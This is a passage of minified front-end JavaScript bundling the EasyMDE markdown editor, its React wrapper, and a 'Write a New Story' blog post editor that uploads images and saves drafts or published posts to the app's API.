`]},uI={link:"URL for the link:",image:"URL of the image:"},cI={locale:"en-US",format:{hour:"2-digit",minute:"2-digit"}},dI={bold:"**",code:"```",italic:"*"},fI={sbInit:"Attach files by drag and dropping or pasting from clipboard.",sbOnDragEnter:"Drop image to upload it.",sbOnDrop:"Uploading image #images_names#...",sbProgress:"Uploading #file_name#: #progress#%",sbOnUploaded:"Uploaded #image_name#",sizeUnits:" B, KB, MB"},hI={noFileGiven:"You must select a file.",typeNotAllowed:"This image type is not allowed.",fileTooLarge:`Image #image_name# is too big (#image_size#).
Maximum file size is #image_max_size#.`,importError:"Something went wrong when uploading the image #image_name#."};function Fe(e){e=e||{},e.parent=this;var t=!0;if(e.autoDownloadFontAwesome===!1&&(t=!1),e.autoDownloadFontAwesome!==!0)for(var n=document.styleSheets,r=0;r<n.length;r++)n[r].href&&n[r].href.indexOf("//maxcdn.bootstrapcdn.com/font-awesome/")>-1&&(t=!1);if(t){var a=document.createElement("link");a.rel="stylesheet",a.href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css",document.getElementsByTagName("head")[0].appendChild(a)}if(e.element)this.element=e.element;else if(e.element===null){console.log("EasyMDE: Error. No element was found.");return}if(e.toolbar===void 0){e.toolbar=[];for(var l in ls)Object.prototype.hasOwnProperty.call(ls,l)&&(l.indexOf("separator-")!=-1&&e.toolbar.push("|"),(ls[l].default===!0||e.showIcons&&e.showIcons.constructor===Array&&e.showIcons.indexOf(l)!=-1)&&e.toolbar.push(l))}if(Object.prototype.hasOwnProperty.call(e,"previewClass")||(e.previewClass="editor-preview"),Object.prototype.hasOwnProperty.call(e,"status")||(e.status=["autosave","lines","words","cursor"],e.uploadImage&&e.status.unshift("upload-image")),e.previewRender||(e.previewRender=function(f){return this.parent.markdown(f)}),e.parsingConfig=ki({highlightFormatting:!0},e.parsingConfig||{}),e.insertTexts=ki({},oI,e.insertTexts||{}),e.promptTexts=ki({},uI,e.promptTexts||{}),e.blockStyles=ki({},dI,e.blockStyles||{}),e.autosave!=null&&(e.autosave.timeFormat=ki({},cI,e.autosave.timeFormat||{})),e.iconClassMap=ki({},Dt,e.iconClassMap||{}),e.shortcuts=ki({},eI,e.shortcuts||{}),e.maxHeight=e.maxHeight||void 0,e.direction=e.direction||"ltr",typeof e.maxHeight<"u"?e.minHeight=e.maxHeight:e.minHeight=e.minHeight||"300px",e.errorCallback=e.errorCallback||function(f){alert(f)},e.uploadImage=e.uploadImage||!1,e.imageMaxSize=e.imageMaxSize||2097152,e.imageAccept=e.imageAccept||"image/png, image/jpeg, image/gif, image/avif",e.imageTexts=ki({},fI,e.imageTexts||{}),e.errorMessages=ki({},hI,e.errorMessages||{}),e.imagePathAbsolute=e.imagePathAbsolute||!1,e.imageCSRFName=e.imageCSRFName||"csrfmiddlewaretoken",e.imageCSRFHeader=e.imageCSRFHeader||!1,e.imageInputName=e.imageInputName||"image",e.autosave!=null&&e.autosave.unique_id!=null&&e.autosave.unique_id!=""&&(e.autosave.uniqueId=e.autosave.unique_id),e.overlayMode&&e.overlayMode.combine===void 0&&(e.overlayMode.combine=!0),this.options=e,this.render(),e.initialValue&&(!this.options.autosave||this.options.autosave.foundSavedValue!==!0)&&this.value(e.initialValue),e.uploadImage){var u=this;this.codemirror.on("dragenter",function(f,h){u.updateStatusBar("upload-image",u.options.imageTexts.sbOnDragEnter),h.stopPropagation(),h.preventDefault()}),this.codemirror.on("dragend",function(f,h){u.updateStatusBar("upload-image",u.options.imageTexts.sbInit),h.stopPropagation(),h.preventDefault()}),this.codemirror.on("dragleave",function(f,h){u.updateStatusBar("upload-image",u.options.imageTexts.sbInit),h.stopPropagation(),h.preventDefault()}),this.codemirror.on("dragover",function(f,h){u.updateStatusBar("upload-image",u.options.imageTexts.sbOnDragEnter),h.stopPropagation(),h.preventDefault()}),this.codemirror.on("drop",function(f,h){h.stopPropagation(),h.preventDefault(),e.imageUploadFunction?u.uploadImagesUsingCustomFunction(e.imageUploadFunction,h.dataTransfer.files):u.uploadImages(h.dataTransfer.files)}),this.codemirror.on("paste",function(f,h){e.imageUploadFunction?u.uploadImagesUsingCustomFunction(e.imageUploadFunction,h.clipboardData.files):u.uploadImages(h.clipboardData.files)})}}Fe.prototype.uploadImages=function(e,t,n){if(e.length!==0){for(var r=[],a=0;a<e.length;a++)r.push(e[a].name),this.uploadImage(e[a],t,n);this.updateStatusBar("upload-image",this.options.imageTexts.sbOnDrop.replace("#images_names#",r.join(", ")))}};Fe.prototype.uploadImagesUsingCustomFunction=function(e,t){if(t.length!==0){for(var n=[],r=0;r<t.length;r++)n.push(t[r].name),this.uploadImageUsingCustomFunction(e,t[r]);this.updateStatusBar("upload-image",this.options.imageTexts.sbOnDrop.replace("#images_names#",n.join(", ")))}};Fe.prototype.updateStatusBar=function(e,t){if(this.gui.statusbar){var n=this.gui.statusbar.getElementsByClassName(e);n.length===1?this.gui.statusbar.getElementsByClassName(e)[0].textContent=t:n.length===0?console.log("EasyMDE: status bar item "+e+" was not found."):console.log("EasyMDE: Several status bar items named "+e+" was found.")}};Fe.prototype.markdown=function(e){if(tm){var t;if(this.options&&this.options.renderingConfig&&this.options.renderingConfig.markedOptions?t=this.options.renderingConfig.markedOptions:t={},this.options&&this.options.renderingConfig&&this.options.renderingConfig.singleLineBreaks===!1?t.breaks=!1:t.breaks=!0,this.options&&this.options.renderingConfig&&this.options.renderingConfig.codeSyntaxHighlighting===!0){var n=this.options.renderingConfig.hljs||window.hljs;n&&(t.highlight=function(a,l){return l&&n.getLanguage(l)?n.highlight(l,a).value:n.highlightAuto(a).value})}tm.use(t);var r=tm.parse(e);return this.options.renderingConfig&&typeof this.options.renderingConfig.sanitizerFunction=="function"&&(r=this.options.renderingConfig.sanitizerFunction.call(this,r)),r=nI(r),r=rI(r),r}};Fe.prototype.render=function(e){if(e||(e=this.element||document.getElementsByTagName("textarea")[0]),this._rendered&&this._rendered===e)return;this.element=e;var t=this.options,n=this,r={};for(var a in t.shortcuts)t.shortcuts[a]!==null&&Ru[a]!==null&&function(O){r[Ak(t.shortcuts[O])]=function(){var N=Ru[O];typeof N=="function"?N(n):typeof N=="string"&&window.open(N,"_blank")}}(a);r.Enter="newlineAndIndentContinueMarkdownList",r.Tab="tabAndIndentMarkdownList",r["Shift-Tab"]="shiftTabAndUnindentMarkdownList",r.Esc=function(O){O.getOption("fullScreen")&&ps(n)},this.documentOnKeyDown=function(O){O=O||window.event,O.keyCode==27&&n.codemirror.getOption("fullScreen")&&ps(n)},document.addEventListener("keydown",this.documentOnKeyDown,!1);var l,u;t.overlayMode?(Vs.defineMode("overlay-mode",function(O){return Vs.overlayMode(Vs.getMode(O,t.spellChecker!==!1?"spell-checker":"gfm"),t.overlayMode.mode,t.overlayMode.combine)}),l="overlay-mode",u=t.parsingConfig,u.gitHubSpice=!1):(l=t.parsingConfig,l.name="gfm",l.gitHubSpice=!1),t.spellChecker!==!1&&(l="spell-checker",u=t.parsingConfig,u.name="gfm",u.gitHubSpice=!1,typeof t.spellChecker=="function"?t.spellChecker({codeMirrorInstance:Vs}):Z_({codeMirrorInstance:Vs}));function f(O,N,T){return{addNew:!1}}if(this.codemirror=Vs.fromTextArea(e,{mode:l,backdrop:u,theme:t.theme!=null?t.theme:"easymde",tabSize:t.tabSize!=null?t.tabSize:2,indentUnit:t.tabSize!=null?t.tabSize:2,indentWithTabs:t.indentWithTabs!==!1,lineNumbers:t.lineNumbers===!0,autofocus:t.autofocus===!0,extraKeys:r,direction:t.direction,lineWrapping:t.lineWrapping!==!1,allowDropFileTypes:["text/plain"],placeholder:t.placeholder||e.getAttribute("placeholder")||"",styleSelectedText:t.styleSelectedText!=null?t.styleSelectedText:!k0(),scrollbarStyle:t.scrollbarStyle!=null?t.scrollbarStyle:"native",configureMouse:f,inputStyle:t.inputStyle!=null?t.inputStyle:k0()?"contenteditable":"textarea",spellcheck:t.nativeSpellcheck!=null?t.nativeSpellcheck:!0,autoRefresh:t.autoRefresh!=null?t.autoRefresh:!1}),this.codemirror.getScrollerElement().style.minHeight=t.minHeight,typeof t.maxHeight<"u"&&(this.codemirror.getScrollerElement().style.height=t.maxHeight),t.forceSync===!0){var h=this.codemirror;h.on("change",function(){h.save()})}this.gui={};var m=document.createElement("div");m.classList.add("EasyMDEContainer"),m.setAttribute("role","application");var x=this.codemirror.getWrapperElement();x.parentNode.insertBefore(m,x),m.appendChild(x),t.toolbar!==!1&&(this.gui.toolbar=this.createToolbar()),t.status!==!1&&(this.gui.statusbar=this.createStatusbar()),t.autosave!=null&&t.autosave.enabled===!0&&(this.autosave(),this.codemirror.on("change",function(){clearTimeout(n._autosave_timeout),n._autosave_timeout=setTimeout(function(){n.autosave()},n.options.autosave.submit_delay||n.options.autosave.delay||1e3)}));function g(O,N){var T,A=window.getComputedStyle(document.querySelector(".CodeMirror-sizer")).width.replace("px","");return O<A?T=N+"px":T=N/O*100+"%",T}var b=this;function E(O,N){var T=new URL(N.url,document.baseURI).href;O.setAttribute("data-img-src",T),O.setAttribute("style","--bg-image:url("+T+");--width:"+N.naturalWidth+"px;--height:"+g(N.naturalWidth,N.naturalHeight)),b.codemirror.setSize()}function C(){t.previewImagesInEditor&&m.querySelectorAll(".cm-image-marker").forEach(function(O){var N=O.parentElement;if(N.innerText.match(/^!\[.*?\]\(.*\)/g)&&!N.hasAttribute("data-img-src")){var T=N.innerText.match(/!\[.*?\]\((.*?)\)/);if(window.EMDEimagesCache||(window.EMDEimagesCache={}),T&&T.length>=2){var A=T[1];if(t.imagesPreviewHandler){var _=t.imagesPreviewHandler(T[1]);typeof _=="string"&&(A=_)}if(window.EMDEimagesCache[A])E(N,window.EMDEimagesCache[A]);else{window.EMDEimagesCache[A]={};var M=document.createElement("img");M.onload=function(){window.EMDEimagesCache[A]={naturalWidth:M.naturalWidth,naturalHeight:M.naturalHeight,url:A},E(N,window.EMDEimagesCache[A])},M.src=A}}}})}this.codemirror.on("update",function(){C()}),this.gui.sideBySide=this.createSideBySide(),this._rendered=this.element,(t.autofocus===!0||e.autofocus)&&this.codemirror.focus();var P=this.codemirror;setTimeout((function(){P.refresh()}).bind(P),0)};Fe.prototype.cleanup=function(){document.removeEventListener("keydown",this.documentOnKeyDown)};function Pk(){if(typeof localStorage=="object")try{localStorage.setItem("smde_localStorage",1),localStorage.removeItem("smde_localStorage")}catch{return!1}else return!1;return!0}Fe.prototype.autosave=function(){if(Pk()){var e=this;if(this.options.autosave.uniqueId==null||this.options.autosave.uniqueId==""){console.log("EasyMDE: You must set a uniqueId to use the autosave feature");return}this.options.autosave.binded!==!0&&(e.element.form!=null&&e.element.form!=null&&e.element.form.addEventListener("submit",function(){clearTimeout(e.autosaveTimeoutId),e.autosaveTimeoutId=void 0,localStorage.removeItem("smde_"+e.options.autosave.uniqueId)}),this.options.autosave.binded=!0),this.options.autosave.loaded!==!0&&(typeof localStorage.getItem("smde_"+this.options.autosave.uniqueId)=="string"&&localStorage.getItem("smde_"+this.options.autosave.uniqueId)!=""&&(this.codemirror.setValue(localStorage.getItem("smde_"+this.options.autosave.uniqueId)),this.options.autosave.foundSavedValue=!0),this.options.autosave.loaded=!0);var t=e.value();t!==""?localStorage.setItem("smde_"+this.options.autosave.uniqueId,t):localStorage.removeItem("smde_"+this.options.autosave.uniqueId);var n=document.getElementById("autosaved");if(n!=null&&n!=null&&n!=""){var r=new Date,a=new Intl.DateTimeFormat([this.options.autosave.timeFormat.locale,"en-US"],this.options.autosave.timeFormat.format).format(r),l=this.options.autosave.text==null?"Autosaved: ":this.options.autosave.text;n.innerHTML=l+a}}else console.log("EasyMDE: localStorage not available, cannot autosave")};Fe.prototype.clearAutosavedValue=function(){if(Pk()){if(this.options.autosave==null||this.options.autosave.uniqueId==null||this.options.autosave.uniqueId==""){console.log("EasyMDE: You must set a uniqueId to clear the autosave value");return}localStorage.removeItem("smde_"+this.options.autosave.uniqueId)}else console.log("EasyMDE: localStorage not available, cannot autosave")};Fe.prototype.openBrowseFileWindow=function(e,t){var n=this,r=this.gui.toolbar.getElementsByClassName("imageInput")[0];r.click();function a(l){n.options.imageUploadFunction?n.uploadImagesUsingCustomFunction(n.options.imageUploadFunction,l.target.files):n.uploadImages(l.target.files,e,t),r.removeEventListener("change",a)}r.addEventListener("change",a)};Fe.prototype.uploadImage=function(e,t,n){var r=this;t=t||function(m){Lk(r,m)};function a(h){r.updateStatusBar("upload-image",h),setTimeout(function(){r.updateStatusBar("upload-image",r.options.imageTexts.sbInit)},1e4),n&&typeof n=="function"&&n(h),r.options.errorCallback(h)}function l(h){var m=r.options.imageTexts.sizeUnits.split(",");return h.replace("#image_name#",e.name).replace("#image_size#",hf(e.size,m)).replace("#image_max_size#",hf(r.options.imageMaxSize,m))}if(e.size>this.options.imageMaxSize){a(l(this.options.errorMessages.fileTooLarge));return}var u=new FormData;u.append("image",e),r.options.imageCSRFToken&&!r.options.imageCSRFHeader&&u.append(r.options.imageCSRFName,r.options.imageCSRFToken);var f=new XMLHttpRequest;f.upload.onprogress=function(h){if(h.lengthComputable){var m=""+Math.round(h.loaded*100/h.total);r.updateStatusBar("upload-image",r.options.imageTexts.sbProgress.replace("#file_name#",e.name).replace("#progress#",m))}},f.open("POST",this.options.imageUploadEndpoint),r.options.imageCSRFToken&&r.options.imageCSRFHeader&&f.setRequestHeader(r.options.imageCSRFName,r.options.imageCSRFToken),f.onload=function(){try{var h=JSON.parse(this.responseText)}catch{console.error("EasyMDE: The server did not return a valid json."),a(l(r.options.errorMessages.importError));return}this.status===200&&h&&!h.error&&h.data&&h.data.filePath?t((r.options.imagePathAbsolute?"":window.location.origin+"/")+h.data.filePath):h.error&&h.error in r.options.errorMessages?a(l(r.options.errorMessages[h.error])):h.error?a(l(h.error)):(console.error("EasyMDE: Received an unexpected response after uploading the image."+this.status+" ("+this.statusText+")"),a(l(r.options.errorMessages.importError)))},f.onerror=function(h){console.error("EasyMDE: An unexpected error occurred when trying to upload the image."+h.target.status+" ("+h.target.statusText+")"),a(r.options.errorMessages.importError)},f.send(u)};Fe.prototype.uploadImageUsingCustomFunction=function(e,t){var n=this;function r(u){Lk(n,u)}function a(u){var f=l(u);n.updateStatusBar("upload-image",f),setTimeout(function(){n.updateStatusBar("upload-image",n.options.imageTexts.sbInit)},1e4),n.options.errorCallback(f)}function l(u){var f=n.options.imageTexts.sizeUnits.split(",");return u.replace("#image_name#",t.name).replace("#image_size#",hf(t.size,f)).replace("#image_max_size#",hf(n.options.imageMaxSize,f))}e.apply(this,[t,r,a])};Fe.prototype.setPreviewMaxHeight=function(){var e=this.codemirror,t=e.getWrapperElement(),n=t.nextSibling,r=parseInt(window.getComputedStyle(t).paddingTop),a=parseInt(window.getComputedStyle(t).borderTopWidth),l=parseInt(this.options.maxHeight),u=l+r*2+a*2,f=u.toString()+"px";n.style.height=f};Fe.prototype.createSideBySide=function(){var e=this.codemirror,t=e.getWrapperElement(),n=t.nextSibling;if(!n||!n.classList.contains("editor-preview-side")){if(n=document.createElement("div"),n.className="editor-preview-side",this.options.previewClass)if(Array.isArray(this.options.previewClass))for(var r=0;r<this.options.previewClass.length;r++)n.classList.add(this.options.previewClass[r]);else typeof this.options.previewClass=="string"&&n.classList.add(this.options.previewClass);t.parentNode.insertBefore(n,t.nextSibling)}if(typeof this.options.maxHeight<"u"&&this.setPreviewMaxHeight(),this.options.syncSideBySidePreviewScroll===!1)return n;var a=!1,l=!1;return e.on("scroll",function(u){if(a){a=!1;return}l=!0;var f=u.getScrollInfo().height-u.getScrollInfo().clientHeight,h=parseFloat(u.getScrollInfo().top)/f,m=(n.scrollHeight-n.clientHeight)*h;n.scrollTop=m}),n.onscroll=function(){if(l){l=!1;return}a=!0;var u=n.scrollHeight-n.clientHeight,f=parseFloat(n.scrollTop)/u,h=(e.getScrollInfo().height-e.getScrollInfo().clientHeight)*f;e.scrollTo(0,h)},n};Fe.prototype.createToolbar=function(e){if(e=e||this.options.toolbar,!(!e||e.length===0)){var t;for(t=0;t<e.length;t++)ls[e[t]]!=null&&(e[t]=ls[e[t]]);var n=document.createElement("div");n.className="editor-toolbar",n.setAttribute("role","toolbar");var r=this,a={};for(r.toolbar=e,t=0;t<e.length;t++)if(!(e[t].name=="guide"&&r.options.toolbarGuideIcon===!1)&&!(r.options.hideIcons&&r.options.hideIcons.indexOf(e[t].name)!=-1)&&!((e[t].name=="fullscreen"||e[t].name=="side-by-side")&&k0())){if(e[t]==="|"){for(var l=!1,u=t+1;u<e.length;u++)e[u]!=="|"&&(!r.options.hideIcons||r.options.hideIcons.indexOf(e[u].name)==-1)&&(l=!0);if(!l)continue}(function(m){var x;if(m==="|"?x=aI():m.children?x=iI(m,r.options.toolbarTips,r.options.shortcuts,r):x=Ld(m,!0,r.options.toolbarTips,r.options.shortcuts,"button",r),a[m.name||m]=x,n.appendChild(x),m.name==="upload-image"){var g=document.createElement("input");g.className="imageInput",g.type="file",g.multiple=!0,g.name=r.options.imageInputName,g.accept=r.options.imageAccept,g.style.display="none",g.style.opacity=0,n.appendChild(g)}})(e[t])}r.toolbar_div=n,r.toolbarElements=a;var f=this.codemirror;f.on("cursorActivity",function(){var m=Pa(f);for(var x in a)(function(g){var b=a[g];m[g]?b.classList.add("active"):g!="fullscreen"&&g!="side-by-side"&&b.classList.remove("active")})(x)});var h=f.getWrapperElement();return h.parentNode.insertBefore(n,h),n}};Fe.prototype.createStatusbar=function(e){e=e||this.options.status;var t=this.options,n=this.codemirror;if(!(!e||e.length===0)){var r=[],a,l,u,f;for(a=0;a<e.length;a++)if(l=void 0,u=void 0,f=void 0,typeof e[a]=="object")r.push({className:e[a].className,defaultValue:e[a].defaultValue,onUpdate:e[a].onUpdate,onActivity:e[a].onActivity});else{var h=e[a];h==="words"?(f=function(E){E.innerHTML=sb(n.getValue())},l=function(E){E.innerHTML=sb(n.getValue())}):h==="lines"?(f=function(E){E.innerHTML=n.lineCount()},l=function(E){E.innerHTML=n.lineCount()}):h==="cursor"?(f=function(E){E.innerHTML="1:1"},u=function(E){var C=n.getCursor(),P=C.line+1,O=C.ch+1;E.innerHTML=P+":"+O}):h==="autosave"?f=function(E){t.autosave!=null&&t.autosave.enabled===!0&&E.setAttribute("id","autosaved")}:h==="upload-image"&&(f=function(E){E.innerHTML=t.imageTexts.sbInit}),r.push({className:h,defaultValue:f,onUpdate:l,onActivity:u})}var m=document.createElement("div");for(m.className="editor-statusbar",a=0;a<r.length;a++){var x=r[a],g=document.createElement("span");g.className=x.className,typeof x.defaultValue=="function"&&x.defaultValue(g),typeof x.onUpdate=="function"&&this.codemirror.on("update",function(E,C){return function(){C.onUpdate(E)}}(g,x)),typeof x.onActivity=="function"&&this.codemirror.on("cursorActivity",function(E,C){return function(){C.onActivity(E)}}(g,x)),m.appendChild(g)}var b=this.codemirror.getWrapperElement();return b.parentNode.insertBefore(m,b.nextSibling),m}};Fe.prototype.value=function(e){var t=this.codemirror;if(e===void 0)return t.getValue();if(t.getDoc().setValue(e),this.isPreviewActive()){var n=t.getWrapperElement(),r=n.lastChild,a=this.options.previewRender(e,r);a!==null&&(r.innerHTML=a)}return this};Fe.toggleBold=zf;Fe.toggleItalic=Wf;Fe.toggleStrikethrough=qf;Fe.toggleBlockquote=Yf;Fe.toggleHeadingSmaller=Ou;Fe.toggleHeadingBigger=Vf;Fe.toggleHeading1=Gf;Fe.toggleHeading2=Qf;Fe.toggleHeading3=Kf;Fe.toggleHeading4=Jg;Fe.toggleHeading5=ex;Fe.toggleHeading6=tx;Fe.toggleCodeBlock=$f;Fe.toggleUnorderedList=Xf;Fe.toggleOrderedList=Zf;Fe.cleanBlock=Jf;Fe.drawLink=eh;Fe.drawImage=th;Fe.drawUploadedImage=nx;Fe.drawTable=nh;Fe.drawHorizontalRule=rh;Fe.undo=ih;Fe.redo=ah;Fe.togglePreview=sh;Fe.toggleSideBySide=Hl;Fe.toggleFullScreen=ps;Fe.prototype.toggleBold=function(){zf(this)};Fe.prototype.toggleItalic=function(){Wf(this)};Fe.prototype.toggleStrikethrough=function(){qf(this)};Fe.prototype.toggleBlockquote=function(){Yf(this)};Fe.prototype.toggleHeadingSmaller=function(){Ou(this)};Fe.prototype.toggleHeadingBigger=function(){Vf(this)};Fe.prototype.toggleHeading1=function(){Gf(this)};Fe.prototype.toggleHeading2=function(){Qf(this)};Fe.prototype.toggleHeading3=function(){Kf(this)};Fe.prototype.toggleHeading4=function(){Jg(this)};Fe.prototype.toggleHeading5=function(){ex(this)};Fe.prototype.toggleHeading6=function(){tx(this)};Fe.prototype.toggleCodeBlock=function(){$f(this)};Fe.prototype.toggleUnorderedList=function(){Xf(this)};Fe.prototype.toggleOrderedList=function(){Zf(this)};Fe.prototype.cleanBlock=function(){Jf(this)};Fe.prototype.drawLink=function(){eh(this)};Fe.prototype.drawImage=function(){th(this)};Fe.prototype.drawUploadedImage=function(){nx(this)};Fe.prototype.drawTable=function(){nh(this)};Fe.prototype.drawHorizontalRule=function(){rh(this)};Fe.prototype.undo=function(){ih(this)};Fe.prototype.redo=function(){ah(this)};Fe.prototype.togglePreview=function(){sh(this)};Fe.prototype.toggleSideBySide=function(){Hl(this)};Fe.prototype.toggleFullScreen=function(){ps(this)};Fe.prototype.isPreviewActive=function(){var e=this.codemirror,t=e.getWrapperElement(),n=t.lastChild;return n.classList.contains("editor-preview-active")};Fe.prototype.isSideBySideActive=function(){var e=this.codemirror,t=e.getWrapperElement(),n=t.nextSibling;return n.classList.contains("editor-preview-active-side")};Fe.prototype.isFullscreenActive=function(){var e=this.codemirror;return e.getOption("fullScreen")};Fe.prototype.getState=function(){var e=this.codemirror;return Pa(e)};Fe.prototype.toTextArea=function(){var e=this.codemirror,t=e.getWrapperElement(),n=t.parentNode;n&&(this.gui.toolbar&&n.removeChild(this.gui.toolbar),this.gui.statusbar&&n.removeChild(this.gui.statusbar),this.gui.sideBySide&&n.removeChild(this.gui.sideBySide)),n.parentNode.insertBefore(t,n),n.remove(),e.toTextArea(),this.autosaveTimeoutId&&(clearTimeout(this.autosaveTimeoutId),this.autosaveTimeoutId=void 0,this.clearAutosavedValue())};var pI=Fe;const mI=bf(pI);var gI=0,xI=()=>`simplemde-editor-${++gI}`,yI=({options:e,id:t,currentValueRef:n,textRef:r})=>{const[a,l]=j.useState(null),u=j.useCallback((m,x,g)=>{const b=e==null?void 0:e.imageUploadFunction;b&&b(m,C=>{x(C)},g)},[e==null?void 0:e.imageUploadFunction]),f=j.useRef(a);f.current=a,j.useEffect(()=>{let m;if(r){const x={element:r,initialValue:n.current},g=e!=null&&e.imageUploadFunction?u:void 0;m=new mI(Object.assign({},x,e,{imageUploadFunction:g})),l(m)}return()=>{m==null||m.toTextArea(),m==null||m.cleanup()}},[r,n,t,u,e]);const h=j.useMemo(()=>a==null?void 0:a.codemirror,[a==null?void 0:a.codemirror]);return{editor:a,codemirror:h}},jk=Vo.forwardRef((e,t)=>{const{events:n,value:r,options:a,children:l,extraKeys:u,getLineAndCursor:f,getMdeInstance:h,getCodemirrorInstance:m,onChange:x,id:g,placeholder:b,textareaProps:E,...C}=e,P=j.useMemo(()=>g??xI(),[g]),O=j.useRef(null),N=j.useRef(!0),T=j.useRef(r);T.current=r;const[A,_]=j.useState(null),{editor:M,codemirror:R}=yI({options:a,id:P,currentValueRef:T,textRef:A});j.useEffect(()=>{N.current&&(M==null||M.value(r??"")),N.current=!0},[M,r]);const B=j.useCallback((Y,ne)=>{(M==null?void 0:M.value())!==T.current&&(N.current=!1,x==null||x((M==null?void 0:M.value())??"",ne))},[M,x]);j.useEffect(()=>{a!=null&&a.autofocus&&(R==null||R.focus(),R==null||R.setCursor(R==null?void 0:R.lineCount(),0))},[R,a==null?void 0:a.autofocus]);const U=j.useCallback(()=>{R&&(f==null||f(R.getDoc().getCursor()))},[R,f]);j.useEffect(()=>{U()},[U]),j.useEffect(()=>{M&&(h==null||h(M))},[M,h]),j.useEffect(()=>{R&&(m==null||m(R))},[R,m,h]),j.useEffect(()=>{u&&R&&R.setOption("extraKeys",Object.assign({},R.getOption("extraKeys"),u))},[R,u]),j.useEffect(()=>{var Y;const ne=(Y=O.current)==null?void 0:Y.getElementsByClassName("editor-toolbarNode")[0],Z=R&&B;return Z?(ne==null||ne.addEventListener("click",Z),()=>{ne==null||ne.removeEventListener("click",Z)}):()=>{}},[R,B]),j.useEffect(()=>(R==null||R.on("change",B),R==null||R.on("cursorActivity",U),()=>{R==null||R.off("change",B),R==null||R.off("cursorActivity",U)}),[R,U,B]);const $=j.useRef(n);return j.useEffect(()=>(n!==$.current&&$.current&&Object.entries($.current).forEach(([ne,Z])=>{Z&&(R==null||R.off(ne,Z))}),n&&Object.entries(n).forEach(([ne,Z])=>{Z&&(R==null||R.on(ne,Z))}),$.current=n,()=>{n&&Object.entries(n).forEach(([ne,Z])=>{Z&&(R==null||R.off(ne,Z))})}),[R,n]),Vo.createElement("div",{id:`${P}-wrapper`,...C,ref:Y=>{typeof t=="function"?t(Y):t&&(t.current=Y),O.current=Y}},Vo.createElement("textarea",{...E,id:P,placeholder:b,ref:_,style:{display:"none"}}))});jk.displayName="SimpleMdeReact";var Rk=jk;function vI(){const{user:e,isAuthenticated:t}=Gt(),n=Ln(),[r,a]=j.useState(""),[l,u]=j.useState(""),[f,h]=j.useState(""),[m,x]=j.useState(""),[g,b]=j.useState(""),[E,C]=j.useState(""),[P,O]=j.useState(null),[N,T]=j.useState([]),[A,_]=j.useState(!1),[M,R]=j.useState(!1),[B,U]=j.useState(""),$=j.useRef(null),Y=j.useRef(null);j.useEffect(()=>{if(!t){n("/login");return}(async()=>{try{const ae=await _e.get("/api/categories");T(ae.data)}catch(ae){console.error("Failed to fetch categories:",ae)}})()},[t,n]);const ne=async oe=>{var xe,q;const ae=new FormData;ae.append("file",oe);try{return(await _e.post("/api/posts/upload-image",ae,{headers:{"Content-Type":"multipart/form-data"}})).data.fileUrl}catch(We){throw console.error("Failed to upload image:",We),new Error(((q=(xe=We.response)==null?void 0:xe.data)==null?void 0:q.message)||"Failed to upload image")}},Z=async oe=>{var xe;const ae=(xe=oe.target.files)==null?void 0:xe[0];if(ae){if(!ae.type.startsWith("image/")){U("Please select an image file");return}if(ae.size>5*1024*1024){U("Image size must be less than 5MB");return}R(!0),U("");try{const q=await ne(ae);C(q),O(ae)}catch(q){U(q.message)}finally{R(!1)}}},me=async(oe,ae,xe)=>{try{const q=await ne(oe);ae(q)}catch(q){xe(q.message)}},ye=j.useMemo(()=>({spellChecker:!1,placeholder:"Write your story...",status:!1,uploadImage:!0,imageUploadFunction:me,toolbar:["bold","italic","heading","|","quote","unordered-list","ordered-list","|","link","upload-image","|","preview","side-by-side","fullscreen","|","guide"]}),[]),J=async()=>{var oe,ae,xe;if(!r.trim()){U("Title is required");return}if(!m.trim()){U("Content is required");return}_(!0),U("");try{const q=((oe=f.match(/#[\w\u00C0-\u024F]+/g))==null?void 0:oe.map(Q=>Q.slice(1)))||[],We={title:r.trim(),content:m.trim(),summary:l.trim(),tags:q,categoryId:g?parseInt(g):null,coverImageUrl:E.trim()||null,status:"DRAFT"};await _e.post("/api/posts",We),n("/dashboard")}catch(q){console.error("Failed to save draft:",q),U(((xe=(ae=q.response)==null?void 0:ae.data)==null?void 0:xe.message)||"Failed to save draft")}finally{_(!1)}},pe=async()=>{var oe,ae,xe;if(!r.trim()){U("Title is required");return}if(!m.trim()){U("Content is required");return}_(!0),U("");try{const q=((oe=f.match(/#[\w\u00C0-\u024F]+/g))==null?void 0:oe.map(k=>k.slice(1)))||[],We={title:r.trim(),content:m.trim(),summary:l.trim(),tags:q,categoryId:g?parseInt(g):null,coverImageUrl:E.trim()||null,status:"PUBLISHED"},Q=await _e.post("/api/posts",We);n(`/post/${Q.data.slug}`)}catch(q){console.error("Failed to publish:",q),U(((xe=(ae=q.response)==null?void 0:ae.data)==null?void 0:xe.message)||"Failed to publish post")}finally{_(!1)}};return o.jsx("div",{className:"min-h-screen bg-gray-50",children:o.jsxs("div",{className:"container mx-auto px-4 py-8 max-w-4xl",children:[o.jsxs("div",{className:"flex items-center justify-between mb-6",children:[o.jsx("h1",{className:"text-3xl font-bold",children:"Write a New Story"}),o.jsx(Ee,{variant:"ghost",onClick:()=>n(-1),children:o.jsx(Bi,{className:"h-5 w-5"})})]}),B&&o.jsx("div",{className:"mb-4 p-4 bg-red-50 border border-red-200 rounded-md",children:o.jsx("p",{className:"text-sm text-red-800",children:B})}),o.jsxs("div",{className:"bg-white rounded-lg shadow-sm p-6 space-y-6",children:[o.jsx("div",{children:o.jsx("input",{type:"text",value:r,onChange:oe=>a(oe.target.value),placeholder:"Title",className:"w-full text-4xl font-bold border-none outline-none focus:ring-0 placeholder-gray-300",disabled:A})}),o.jsx("div",{children:o.jsx("textarea",{value:l,onChange:oe=>u(oe.target.value),placeholder:"Write a short summary...",className:"w-full text-xl text-gray-600 border-none outline-none focus:ring-0 placeholder-gray-300 resize-none",rows:2,disabled:A})}),o.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4 pt-4 border-t",children:[o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Category"}),o.jsxs("select",{value:g,onChange:oe=>b(oe.target.value),className:"w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500",disabled:A,children:[o.jsx("option",{value:"",children:"Select a category"}),N.map(oe=>o.jsx("option",{value:oe.id,children:oe.name},oe.id))]})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Cover Image"}),o.jsxs("div",{className:"flex items-center 